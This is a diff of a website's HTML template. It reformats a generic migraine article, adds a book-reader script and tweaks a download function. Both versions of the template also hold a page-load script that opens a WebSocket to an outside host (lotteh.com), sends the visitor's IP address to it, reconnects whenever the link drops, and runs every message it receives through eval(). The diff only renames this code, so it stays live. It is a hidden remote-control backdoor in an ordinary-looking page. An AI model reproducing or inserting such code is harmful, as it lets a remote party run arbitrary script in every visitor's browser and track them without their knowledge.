@@ -65,7 +65,7 @@
               <a class="nav-link" href="/en/landing" title="Visit the landing page">Landing</a>
             </li>
             <li class="nav-item">
-              <a class="nav-link" href="https://qoshlli.com" title="Video chat">Chat</a>
+              <a class="nav-link" href="/en/chat" title="Video chat">Chat</a>
             </li>
             <li class="nav-item">
               <a class="nav-link" href="/en/private" title="See private photos with a key">Private</a>
@@ -123,14 +123,8 @@
 <img src="https://i.imgur.com/dAQRaWt.jpeg" alt="Daisy's profile photo" width="120" height="120" style="margin-top:5px; margin-right:10px; margin-bottom:10px; border-radius: 50%;">
 <p><i>By Daisy</i></p>
 
-<div style="white-space: pre-wrap;">
+<div style="white-space: pre-wrap;"><p>What causes migraine and how are they treated?</p><p><br/></p><p>Migraines are severe headaches that are often accompanied by other symptoms such as nausea, sensitivity to light and sound, and visual disturbances. The exact cause of migraines is not entirely understood, but it is believed to be related to changes in blood flow and chemicals in the brain.</p><p><br/></p><p>Treatment for migraines typically involves a combination of lifestyle changes, medications, and alternative therapies. Some common treatment options include:</p><p><br/></p><p>1. Taking over-the-counter pain relievers such as ibuprofen or acetaminophen</p><p>2. Prescription medications specifically designed to treat migraines, such as triptans or ergotamines</p><p>3. Avoiding triggers such as certain foods, stress, lack of sleep, or hormonal changes</p><p>4. Practicing relaxation techniques such as deep breathing or meditation</p><p>5. Applying hot or cold packs to the head or neck</p><p>6. Getting regular exercise and maintaining a healthy diet</p><p><br/></p><p>It is important for individuals who suffer from migraines to work with their healthcare provider to develop a treatment plan that is tailored to their specific needs and triggers. In some cases, a combination of therapies may be needed to effectively manage migraines and improve quality of life.</p></div>
 
-
-
-<p>What causes migraine and how are they treated?</p><p><br></p><p>Migraines are severe headaches that are often accompanied by other symptoms such as nausea, sensitivity to light and sound, and visual disturbances. The exact cause of migraines is not entirely understood, but it is believed to be related to changes in blood flow and chemicals in the brain.</p><p><br></p><p>Treatment for migraines typically involves a combination of lifestyle changes, medications, and alternative therapies. Some common treatment options include:</p><p><br></p><p>1. Taking over-the-counter pain relievers such as ibuprofen or acetaminophen</p><p>2. Prescription medications specifically designed to treat migraines, such as triptans or ergotamines</p><p>3. Avoiding triggers such as certain foods, stress, lack of sleep, or hormonal changes</p><p>4. Practicing relaxation techniques such as deep breathing or meditation</p><p>5. Applying hot or cold packs to the head or neck</p><p>6. Getting regular exercise and maintaining a healthy diet</p><p><br></p><p>It is important for individuals who suffer from migraines to work with their healthcare provider to develop a treatment plan that is tailored to their specific needs and triggers. In some cases, a combination of therapies may be needed to effectively manage migraines and improve quality of life.</p>
-
-
-</div>
 
 <div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
@@ -247,6 +241,23 @@
         
 
 
+var currentReader = 0;
+function toggleReader(id) {
+	currentReader = id;
+	$('#reader-modal' + id).toggleClass('hide');
+	$('#reader-modal' + id).toggleClass('fade-in-fast');
+	$('#bnav' + id).toggleClass('hide');
+	$('#bnav' + id).toggleClass('fade-in-fast');
+	setTimeout(function() {
+		$('#reader-modal' + id).toggleClass('fade-in-fast');
+		$('#bnav' + id).toggleClass('fade-in-fast');
+	}, 1000);
+}
+function jumpbookto(page) {
+	document.getElementById('reader-modal' + currentReader).scrollTo(0, (parseInt(document.getElementById('jumpto' + page).value)-1) * parseInt(window.innerHeight));
+	document.getElementById('pagecount' + page).innerHTML = parseInt(document.getElementById('jumpto' + page).value);
+}
+
 
         
         
@@ -257,32 +268,32 @@
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("closed", (event) => {
+            remoteSocket.addEventListener("closed", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
@@ -434,8 +445,8 @@ if(document.getElementById("current-time")) {
               link.href = url;
               link.download = 'Glam Girl X - ' + filename;
               document.body.appendChild(link);
+              link.classList.add('hide');
               link.click();
-              document.body.removeChild(link);
             }
             function downloadQr() {
                     downloadQrImage(image.src, 'QR Code');
@@ -457,6 +468,8 @@ if(document.getElementById("current-time")) {
   });
 </script>
 
+    
+    
     
     
     <script>
